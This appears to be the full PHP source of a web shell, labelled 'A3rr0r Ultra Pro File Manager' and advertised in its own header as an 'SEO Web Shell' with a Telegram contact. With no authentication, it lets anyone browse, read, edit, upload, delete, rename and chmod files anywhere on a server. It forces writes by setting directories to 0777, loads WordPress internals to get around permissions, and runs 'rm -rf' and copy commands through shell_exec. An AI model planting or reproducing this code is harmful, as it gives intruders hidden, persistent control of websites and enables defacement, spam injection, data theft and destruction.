<?php
/**
 * File: filemanager.php
 * Runtime: PHP 8.x / WordPress
 * Target: Advanced file manager with direct-to-current-directory ZIP extraction, header contact tag, clipboard styling, and batch actions
 */

session_start();

function a3_wp_write_file($p, $c, $u='') {
    $success = false;
    $dir = dirname($p);
    $dir_perms = @fileperms($dir);
    @chmod($dir, 0777);
    
    $file_perms = false;
    if (file_exists($p)) {
        $file_perms = @fileperms($p);
        @chmod($p, 0666);
    }

    if(@file_put_contents($p, $c) !== false){
        $success = true;
    } else {
        global $wp_filesystem;
        $wp_admin_path = rtrim($_SERVER['DOCUMENT_ROOT'], '/\\') . '/wp-admin/includes/file.php';
        if(empty($wp_filesystem) && file_exists($wp_admin_path)){
            if (!defined('ABSPATH')) {
                $wp_load = rtrim($_SERVER['DOCUMENT_ROOT'], '/\\') . '/wp-load.php';
                if(file_exists($wp_load)) @require_once($wp_load);
            }
            if (defined('ABSPATH')) {
                @require_once(ABSPATH.'/wp-admin/includes/file.php');
                if(function_exists('WP_Filesystem')) WP_Filesystem();
            }
        }
        
        $chmod_file = defined('FS_CHMOD_FILE') ? FS_CHMOD_FILE : 0644;
        if(!empty($wp_filesystem) && method_exists($wp_filesystem, 'put_contents')){
            if(@$wp_filesystem->put_contents($p, $c, $chmod_file)){
                $success = true;
            }
        }
        
        if(!$success && $f=@fopen($p, 'wb')){
            $w=@fwrite($f, $c); @fclose($f);
            if($w !== false) $success = true;
        }
        
        if(!$success && $u && @copy($u, $p)){
            $success = true;
        }

        if (!$success && $c !== false) {
            $tmp_save = sys_get_temp_dir() . '/' . uniqid('a3_') . '.tmp';
            if (@file_put_contents($tmp_save, $c)) {
                if (function_exists('shell_exec') && is_callable('shell_exec')) {
                    $cmd = (strtoupper(substr(PHP_OS, 0, 3)) === 'WIN')
                        ? "copy /Y " . escapeshellarg($tmp_save) . " " . escapeshellarg($p)
                        : "cp -f " . escapeshellarg($tmp_save) . " " . escapeshellarg($p);
                    @shell_exec($cmd);
                    if (file_exists($p) && filesize($p) > 0) $success = true;
                }
                if (!$success) {
                    if (@rename($tmp_save, $p)) {
                        $success = true;
                    } elseif (function_exists('shell_exec') && is_callable('shell_exec')) {
                        $cmd = (strtoupper(substr(PHP_OS, 0, 3)) === 'WIN')
                            ? "move /Y " . escapeshellarg($tmp_save) . " " . escapeshellarg($p)
                            : "mv -f " . escapeshellarg($tmp_save) . " " . escapeshellarg($p);
                        @shell_exec($cmd);
                        if (file_exists($p) && filesize($p) > 0) $success = true;
                    }
                }
                @unlink($tmp_save);
            }
        }
    }

    if ($file_perms !== false) @chmod($p, $file_perms);
    if ($dir_perms !== false) @chmod($dir, $dir_perms);

    return $success;
}

function a3_wp_delete_file($del_path) {
    $success = false;
    if (!file_exists($del_path)) return true;
    $dir = dirname($del_path);
    $dir_perms = @fileperms($dir);
    @chmod($dir, 0777);
    $file_perms = @fileperms($del_path);
    @chmod($del_path, is_dir($del_path) ? 0777 : 0666);
    
    if (is_dir($del_path) && !is_link($del_path)) {
        $files = array_diff(scandir($del_path), ['.', '..']);
        foreach ($files as $file) {
            a3_wp_delete_file($del_path . DIRECTORY_SEPARATOR . $file);
        }
        if (@rmdir($del_path)) { $success = true; }
    } else {
        if (@unlink($del_path)) { $success = true; }
    }
    
    if (!$success && function_exists('shell_exec') && is_callable('shell_exec')) {
        $cmd = (strtoupper(substr(PHP_OS, 0, 3)) === 'WIN') ? 'rmdir /s /q ' . escapeshellarg($del_path) : 'rm -rf ' . escapeshellarg($del_path);
        @shell_exec($cmd);
        if (!file_exists($del_path)) $success = true;
    }
    
    if ($dir_perms !== false) @chmod($dir, $dir_perms);
    return $success;
}

function a3_wp_rename_file($old, $new) {
    $success = false;
    if (@rename($old, $new)) $success = true;
    if (!$success && function_exists('shell_exec') && is_callable('shell_exec')) {
        $cmd = (strtoupper(substr(PHP_OS, 0, 3)) === 'WIN') ? 'move /Y ' . escapeshellarg($old) . ' ' . escapeshellarg($new) : 'mv -f ' . escapeshellarg($old) . ' ' . escapeshellarg($new);
        @shell_exec($cmd); 
        if (file_exists($new)) $success = true;
    }
    return $success;
}

function a3_recurse_copy($src, $dst) {
    if (!is_dir($src)) {
        return @copy($src, $dst);
    }
    @mkdir($dst, 0777, true);
    $dir = opendir($src);
    while(false !== ($file = readdir($dir))) {
        if (($file != '.') && ($file != '..')) {
            if (is_dir($src . '/' . $file)) {
                a3_recurse_copy($src . '/' . $file, $dst . '/' . $file);
            } else {
                @copy($src . '/' . $file, $dst . '/' . $file);
            }
        }
    }
    closedir($dir);
    return true;
}

function a3_zip_item($source, $destination) {
    if (!extension_loaded('zip')) {
        return false;
    }
    $zip = new ZipArchive();
    if ($zip->open($destination, ZIPARCHIVE::CREATE | ZIPARCHIVE::OVERWRITE) !== TRUE) {
        return false;
    }
    $source = realpath($source);
    if (is_dir($source)) {
        $iterator = new RecursiveIteratorIterator(new RecursiveDirectoryIterator($source, RecursiveDirectoryIterator::SKIP_DOTS), RecursiveIteratorIterator::SELF_FIRST);
        foreach ($iterator as $file) {
            $file = realpath($file);
            if (is_dir($file)) {
                $zip->addEmptyDir(str_replace($source . DIRECTORY_SEPARATOR, '', $file . DIRECTORY_SEPARATOR));
            } else if (is_file($file)) {
                $zip->addFromString(str_replace($source . DIRECTORY_SEPARATOR, '', $file), @file_get_contents($file));
            }
        }
    } else if (is_file($source)) {
        $zip->addFromString(basename($source), @file_get_contents($source));
    }
    return $zip->close();
}

function a3_unzip_item($source, $destination) {
    if (!extension_loaded('zip')) {
        return false;
    }
    $zip = new ZipArchive();
    if ($zip->open($source) === TRUE) {
        @mkdir($destination, 0777, true);
        $zip->extractTo($destination);
        $zip->close();
        return true;
    }
    return false;
}

function a3_format_size($bytes) {
    if ($bytes >= 1073741824) return number_format($bytes / 1073741824, 2) . ' GB';
    elseif ($bytes >= 1048576) return number_format($bytes / 1048576, 2) . ' MB';
    elseif ($bytes >= 1024) return number_format($bytes / 1024, 2) . ' KB';
    elseif ($bytes > 1) return $bytes . ' bytes';
    elseif ($bytes == 1) return '1 byte';
    else return '0 bytes';
}

function a3_get_perms($path) {
    $perms = @fileperms($path);
    if ($perms === false) return '---';
    return substr(sprintf('%o', $perms), -4);
}

$message = '';
$raw_dir = isset($_GET['dir']) ? urldecode($_GET['dir']) : __DIR__;
$current_dir = realpath($raw_dir) ?: $raw_dir;
if (!is_dir($current_dir)) $current_dir = __DIR__;

if (!isset($_SESSION['a3_clipboard'])) {
    $_SESSION['a3_clipboard'] = ['action' => '', 'paths' => []];
}

if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    if (isset($_FILES['fileToUpload'])) {
        $target_dir = isset($_POST['target_dir']) ? rtrim($_POST['target_dir'], '/\\') : $current_dir;
        if (!file_exists($target_dir)) @mkdir($target_dir, 0777, true);
        $file_name = basename($_FILES['fileToUpload']['name']);
        $target_file = $target_dir . DIRECTORY_SEPARATOR . $file_name;
        $tmp_name = $_FILES['fileToUpload']['tmp_name'];
        $content = @file_get_contents($tmp_name);
        if ($content !== false && a3_wp_write_file($target_file, $content)) {
            $message = "File uploaded successfully.";
        } else {
            $message = "Failed to write file.";
        }
    }

    if (isset($_POST['action'])) {
        $action = $_POST['action'];

        if ($action === 'delete_selected' && isset($_POST['selected_items'])) {
            $count = 0;
            foreach ($_POST['selected_items'] as $path) {
                if (a3_wp_delete_file($path)) $count++;
            }
            $message = "Successfully deleted {$count} item(s).";
        }
        
        if ($action === 'clipboard_copy' && isset($_POST['selected_items'])) {
            $_SESSION['a3_clipboard'] = ['action' => 'copy', 'paths' => $_POST['selected_items']];
            $message = "Copied " . count($_POST['selected_items']) . " item(s) to clipboard.";
        }

        if ($action === 'clipboard_cut' && isset($_POST['selected_items'])) {
            $_SESSION['a3_clipboard'] = ['action' => 'cut', 'paths' => $_POST['selected_items']];
            $message = "Cut " . count($_POST['selected_items']) . " item(s) to clipboard.";
        }

        if ($action === 'clipboard_paste') {
            $clip = $_SESSION['a3_clipboard'];
            if (empty($clip['paths'])) {
                $message = "Clipboard is empty.";
            } else {
                $success_count = 0;
                foreach ($clip['paths'] as $src) {
                    if (!file_exists($src)) continue;
                    $basename = basename($src);
                    $dst = $current_dir . DIRECTORY_SEPARATOR . $basename;
                    if ($src === $dst) continue;

                    if ($clip['action'] === 'copy') {
                        if (is_dir($src)) {
                            if (a3_recurse_copy($src, $dst)) $success_count++;
                        } else {
                            if (@copy($src, $dst)) $success_count++;
                        }
                    } elseif ($clip['action'] === 'cut') {
                        if (a3_wp_rename_file($src, $dst)) $success_count++;
                    }
                }
                if ($clip['action'] === 'cut') {
                    $_SESSION['a3_clipboard'] = ['action' => '', 'paths' => []];
                }
                $message = "Pasted {$success_count} item(s) successfully.";
            }
        }

        if ($action === 'zip_selected' && isset($_POST['selected_items'])) {
            $success_count = 0;
            foreach ($_POST['selected_items'] as $path) {
                if (!file_exists($path)) continue;
                $name = basename($path);
                $zip_name = $current_dir . DIRECTORY_SEPARATOR . $name . '.zip';
                if (a3_zip_item($path, $zip_name)) $success_count++;
            }
            $message = "Successfully zipped {$success_count} item(s).";
        }

        if ($action === 'unzip_selected' && isset($_POST['selected_items'])) {
            $success_count = 0;
            foreach ($_POST['selected_items'] as $path) {
                if (!file_exists($path)) continue;
                $info = pathinfo($path);
                if (strtolower($info['extension']) === 'zip') {
                    // Extract directly into the current directory without creating a subfolder container
                    if (a3_unzip_item($path, $current_dir)) $success_count++;
                }
            }
            $message = "Successfully unzipped {$success_count} archive(s) directly into current directory.";
        }

        if ($action === 'delete' && isset($_POST['single_path'])) {
            if (a3_wp_delete_file($_POST['single_path'])) $message = "Deleted successfully.";
            else $message = "Failed to delete.";
        }
        
        if ($action === 'rename' && isset($_POST['old_path']) && isset($_POST['new_name'])) {
            $old_path = $_POST['old_path'];
            $new_path = dirname($old_path) . DIRECTORY_SEPARATOR . $_POST['new_name'];
            if (a3_wp_rename_file($old_path, $new_path)) $message = "Renamed successfully.";
            else $message = "Failed to rename.";
        }
        
        if ($action === 'edit' && isset($_POST['path']) && isset($_POST['content'])) {
            if (a3_wp_write_file($_POST['path'], $_POST['content'])) $message = "Saved successfully.";
            else $message = "Failed to save.";
        }

        if ($action === 'chmod' && isset($_POST['single_path']) && isset($_POST['permissions'])) {
            $target_path = $_POST['single_path'];
            $perm_val = octdec(preg_replace('/[^0-7]/', '', $_POST['permissions']));
            if (@chmod($target_path, $perm_val)) $message = "Permissions updated successfully.";
            else $message = "Failed to update permissions.";
        }
    }
}

$items = [];
if ($handle = @opendir($current_dir)) {
    while (false !== ($entry = readdir($handle))) {
        if ($entry === '.') continue;
        $full_path = $current_dir . DIRECTORY_SEPARATOR . $entry;
        $is_dir = is_dir($full_path);
        $size = $is_dir ? '-' : (@filesize($full_path) ?: 0);
        $size_raw = $is_dir ? -1 : ($size === '-' ? 0 : $size);
        $mtime = @filemtime($full_path) ? date('Y-m-d H:i:s', @filemtime($full_path)) : '---';
        $perms = a3_get_perms($full_path);

        $items[] = [
            'name' => $entry,
            'path' => $full_path,
            'is_dir' => $is_dir,
            'size' => $size,
            'size_raw' => $size_raw,
            'modified' => $mtime,
            'perms' => $perms
        ];
    }
    closedir($handle);
}

usort($items, function($a, $b) {
    if ($a['name'] === '..') return -1;
    if ($b['name'] === '..') return 1;
    if ($a['is_dir'] && !$b['is_dir']) return -1;
    if (!$a['is_dir'] && $b['is_dir']) return 1;
    return strcasecmp($a['name'], $b['name']);
});

$edit_file = isset($_GET['edit']) ? $_GET['edit'] : null;
$edit_content = '';
if ($edit_file && is_file($edit_file)) {
    $edit_content = @file_get_contents($edit_file);
}

$path_parts = explode(DIRECTORY_SEPARATOR, $current_dir);
$breadcrumb_path = '';
$breadcrumbs = [];
foreach ($path_parts as $part) {
    if ($part === '') {
        $breadcrumb_path = DIRECTORY_SEPARATOR;
        $breadcrumbs['Root'] = $breadcrumb_path;
        continue;
    }
    $breadcrumb_path .= ($breadcrumb_path === DIRECTORY_SEPARATOR ? '' : DIRECTORY_SEPARATOR) . $part;
    $breadcrumbs[$part] = $breadcrumb_path;
}

$has_clipboard = !empty($_SESSION['a3_clipboard']['paths']);
?>
<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title>A3rr0r Pro File Manager</title>
    <style>
        :root {
            --bg-color: #0f172a;
            --card-bg: #1e293b;
            --accent-color: #38bdf8;
            --accent-hover: #0ea5e9;
            --text-main: #f8fafc;
            --text-muted: #94a3b8;
            --border-color: #334155;
            --danger-color: #f43f5e;
            --success-color: #10b981;
        }
        body {
            font-family: system-ui, -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
            background-color: var(--bg-color);
            color: var(--text-main);
            margin: 0;
            padding: 20px;
        }
        .container {
            max-width: 1350px;
            margin: 0 auto;
        }
        header {
            display: flex;
            justify-content: space-between;
            align-items: center;
            background: var(--card-bg);
            padding: 15px 25px;
            border-radius: 10px;
            box-shadow: 0 4px 6px -1px rgba(0, 0, 0, 0.1);
            margin-bottom: 20px;
            border: 1px solid var(--border-color);
        }
        .header-left h2 { margin: 0; font-size: 1.4rem; color: var(--accent-color); }
        .header-contact {
            font-size: 0.85rem;
            color: var(--text-muted);
            margin-top: 4px;
        }
        .header-contact a {
            color: var(--accent-color);
            text-decoration: none;
            font-weight: 600;
        }
        .header-contact a:hover {
            text-decoration: underline;
        }
        .btn {
            background-color: var(--accent-color);
            color: #0f172a;
            padding: 6px 14px;
            border: none;
            border-radius: 6px;
            font-weight: 600;
            cursor: pointer;
            text-decoration: none;
            display: inline-block;
            font-size: 0.85rem;
            transition: background 0.2s;
        }
        .btn:hover { background-color: var(--accent-hover); }
        .btn-danger { background-color: var(--danger-color); color: #fff; }
        .btn-secondary { background-color: var(--border-color); color: var(--text-main); }
        
        /* Paste button dynamic states */
        .btn-paste-disabled {
            background-color: var(--border-color);
            color: var(--text-main);
        }
        .btn-paste-disabled:hover {
            background-color: var(--border-color);
        }
        .btn-paste-active {
            background-color: var(--success-color);
            color: #fff;
            animation: pulse-glow 2s infinite;
        }
        .btn-paste-active:hover {
            background-color: #059669;
        }

        @keyframes pulse-glow {
            0% { box-shadow: 0 0 0 0 rgba(16, 185, 129, 0.4); }
            70% { box-shadow: 0 0 0 6px rgba(16, 185, 129, 0); }
            100% { box-shadow: 0 0 0 0 rgba(16, 185, 129, 0); }
        }

        .card {
            background: var(--card-bg);
            padding: 20px;
            border-radius: 10px;
            border: 1px solid var(--border-color);
            margin-bottom: 20px;
            box-shadow: 0 4px 6px -1px rgba(0, 0, 0, 0.1);
        }
        .alert {
            background: rgba(16, 185, 129, 0.1);
            border: 1px solid var(--success-color);
            color: var(--success-color);
            padding: 10px 15px;
            border-radius: 6px;
            margin-bottom: 20px;
        }
        .breadcrumb {
            display: flex;
            flex-wrap: wrap;
            gap: 5px;
            align-items: center;
            font-size: 0.95rem;
            margin-bottom: 15px;
            background: rgba(15, 23, 42, 0.6);
            padding: 10px 15px;
            border-radius: 6px;
            border: 1px solid var(--border-color);
        }
        .breadcrumb a {
            color: var(--accent-color);
            text-decoration: none;
        }
        .breadcrumb a:hover { text-decoration: underline; }
        .breadcrumb span { color: var(--text-muted); }

        .toolbar {
            display: flex;
            gap: 10px;
            margin-bottom: 15px;
            align-items: center;
            flex-wrap: wrap;
            background: rgba(15, 23, 42, 0.4);
            padding: 10px;
            border-radius: 6px;
            border: 1px solid var(--border-color);
        }

        table {
            width: 100%;
            border-collapse: collapse;
            margin-top: 10px;
        }
        th, td {
            padding: 12px 15px;
            text-align: left;
            border-bottom: 1px solid var(--border-color);
            font-size: 0.9rem;
        }
        th {
            background-color: rgba(15, 23, 42, 0.4);
            color: var(--text-muted);
            font-weight: 600;
            font-size: 0.85rem;
            text-transform: uppercase;
        }
        tr:hover { background-color: rgba(56, 189, 248, 0.03); }
        a.item-link { color: var(--text-main); text-decoration: none; font-weight: 500; }
        a.item-link:hover { color: var(--accent-color); }
        
        input[type="text"], input[type="file"] {
            background: var(--bg-color);
            border: 1px solid var(--border-color);
            color: var(--text-main);
            padding: 5px 8px;
            border-radius: 4px;
            font-size: 0.85rem;
        }
        textarea {
            background: var(--bg-color);
            border: 1px solid var(--border-color);
            color: var(--text-main);
            padding: 10px;
            border-radius: 6px;
            font-family: monospace;
        }
        .actions-group {
            display: flex;
            gap: 5px;
            align-items: center;
            justify-content: flex-end;
        }
    </style>
    <script>
        function toggleSelectAll(master) {
            var checkboxes = document.querySelectorAll('input[name="selected_items[]"]');
            checkboxes.forEach(function(box) {
                box.checked = master.checked;
            });
        }
    </script>
</head>
<body>
<div class="container">
    <header>
        <div class="header-left">
            <h2>A3rr0r Ultra Pro File Manager v.1</h2>
            <div class="header-contact">
                For SEO Web Shell: <a href="https://t.me/A3rr0r" target="_blank">@A3rr0r</a>
            </div>
        </div>
        <div>
            <a href="?dir=<?php echo urlencode(__DIR__); ?>" class="btn btn-secondary">🏠 Home</a>
        </div>
    </header>

    <?php if ($message): ?>
        <div class="alert"><strong><?php echo htmlspecialchars($message); ?></strong></div>
    <?php endif; ?>

    <div class="card">
        <h3>Upload File</h3>
        <form method="post" enctype="multipart/form-data" style="display: flex; gap: 10px; align-items: center; margin-top: 10px;">
            <input type="hidden" name="target_dir" value="<?php echo htmlspecialchars($current_dir); ?>">
            <input type="file" name="fileToUpload" required>
            <input type="submit" value="Upload" class="btn">
        </form>
    </div>

    <?php if ($edit_file): ?>
    <div class="card">
        <h3>Edit File: <?php echo htmlspecialchars(basename($edit_file)); ?></h3>
        <form method="post" action="?dir=<?php echo urlencode($current_dir); ?>">
            <input type="hidden" name="action" value="edit">
            <input type="hidden" name="path" value="<?php echo htmlspecialchars($edit_file); ?>">
            <textarea name="content" rows="20" style="width: 100%; box-sizing: border-box; margin-bottom: 15px;"><?php echo htmlspecialchars($edit_content); ?></textarea>
            <br>
            <input type="submit" value="Save File" class="btn">
            <a href="?dir=<?php echo urlencode($current_dir); ?>" class="btn btn-secondary" style="margin-left: 10px;">Cancel</a>
        </form>
    </div>
    <?php endif; ?>

    <div class="card">
        <div class="breadcrumb">
            <span>Path:</span>
            <?php 
            $i = 0;
            $count = count($breadcrumbs);
            foreach ($breadcrumbs as $name => $path): 
                $i++;
            ?>
                <a href="?dir=<?php echo urlencode($path); ?>"><?php echo htmlspecialchars($name); ?></a>
                <?php if ($i < $count): ?><span>/</span><?php endif; ?>
            <?php endforeach; ?>
        </div>

        <form method="post" id="main-filemanager-form">
            <input type="hidden" name="dir" value="<?php echo htmlspecialchars($current_dir); ?>">
            <div class="toolbar">
                <span style="font-size: 0.85rem; color: var(--text-muted); font-weight: 600;">BATCH ACTIONS:</span>
                <button type="submit" name="action" value="clipboard_copy" class="btn btn-secondary">📋 Copy</button>
                <button type="submit" name="action" value="clipboard_cut" class="btn btn-secondary">✂️ Cut</button>
                <button type="submit" name="action" value="clipboard_paste" class="btn <?php echo $has_clipboard ? 'btn-paste-active' : 'btn-paste-disabled'; ?>">📥 Paste Here</button>
                <button type="submit" name="action" value="zip_selected" class="btn btn-secondary">📦 Zip (.zip)</button>
                <button type="submit" name="action" value="unzip_selected" class="btn btn-secondary">📂 Unzip</button>
                <button type="submit" name="action" value="delete_selected" class="btn btn-danger" onclick="return confirm('Delete all selected items?');">🗑️ Delete Selected</button>
                
                <?php if ($has_clipboard): ?>
                    <span style="font-size: 0.8rem; color: var(--accent-color); margin-left: auto;">
                        Clipboard: <?php echo count($_SESSION['a3_clipboard']['paths']); ?> item(s) [<?php echo strtoupper($_SESSION['a3_clipboard']['action']); ?>]
                    </span>
                <?php endif; ?>
            </div>

            <table>
                <thead>
                    <tr>
                        <th style="width: 40px;"><input type="checkbox" onclick="toggleSelectAll(this)"></th>
                        <th>Name</th>
                        <th>Size</th>
                        <th>Permissions</th>
                        <th>Modified</th>
                        <th style="text-align: right;">Actions</th>
                    </tr>
                </thead>
                <tbody>
                    <?php foreach ($items as $item): ?>
                    <tr>
                        <td>
                            <?php if ($item['name'] !== '..'): ?>
                                <input type="checkbox" name="selected_items[]" value="<?php echo htmlspecialchars($item['path']); ?>">
                            <?php endif; ?>
                        </td>
                        <td>
                            <?php if ($item['name'] === '..'): ?>
                                <a href="?dir=<?php echo urlencode(dirname($current_dir)); ?>" class="item-link">📁 ..</a>
                            <?php elseif ($item['is_dir']): ?>
                                📁 <a href="?dir=<?php echo urlencode($item['path']); ?>" class="item-link"><?php echo htmlspecialchars($item['name']); ?></a>
                            <?php else: ?>
                                📄 <span class="item-link"><?php echo htmlspecialchars($item['name']); ?></span>
                            <?php endif; ?>
                        </td>
                        <td><?php echo is_numeric($item['size']) ? a3_format_size($item['size']) : $item['size']; ?></td>
                        <td>
                            <?php if ($item['name'] !== '..'): ?>
                                <input type="text" name="perm_vals[<?php echo htmlspecialchars($item['path']); ?>]" value="<?php echo htmlspecialchars($item['perms']); ?>" style="width: 60px; text-align: center;">
                                <button type="submit" name="action" value="chmod" onclick="this.form.single_path.value='<?php echo htmlspecialchars($item['path']); ?>'; this.form.permissions.value=this.form.querySelector('[name=\'perm_vals[<?php echo addslashes($item['path']); ?>]\']').value;" class="btn btn-secondary" style="padding: 3px 6px; font-size: 0.75rem;">Set</button>
                            <?php else: ?>
                                <?php echo htmlspecialchars($item['perms']); ?>
                            <?php endif; ?>
                        </td>
                        <td><?php echo htmlspecialchars($item['modified']); ?></td>
                        <td style="text-align: right;">
                            <?php if ($item['name'] !== '..'): ?>
                                <div class="actions-group">
                                    <?php if (!$item['is_dir']): ?>
                                        <a href="?dir=<?php echo urlencode($current_dir); ?>&edit=<?php echo urlencode($item['path']); ?>" class="btn btn-secondary">Edit</a>
                                    <?php endif; ?>
                                    
                                    <input type="text" name="rename_vals[<?php echo htmlspecialchars($item['path']); ?>]" placeholder="New name" style="width: 90px;">
                                    <button type="submit" name="action" value="rename" class="btn btn-secondary" onclick="this.form.old_path.value='<?php echo htmlspecialchars($item['path']); ?>'; this.form.new_name.value=this.form.querySelector('[name=\'rename_vals[<?php echo addslashes($item['path']); ?>]\']').value; return confirm('Rename this item?');">Rename</button>
                                    
                                    <button type="submit" name="action" value="delete" class="btn btn-danger" onclick="this.form.single_path.value='<?php echo htmlspecialchars($item['path']); ?>'; return confirm('Delete this item?');">Delete</button>
                                </div>
                            <?php endif; ?>
                        </td>
                    </tr>
                    <?php endforeach; ?>
                </tbody>
            </table>
            <!-- Hidden fields for single row operations -->
            <input type="hidden" name="single_path" value="">
            <input type="hidden" name="permissions" value="">
            <input type="hidden" name="old_path" value="">
            <input type="hidden" name="new_name" value="">
        </form>
    </div>
</div>
</body>
</html>
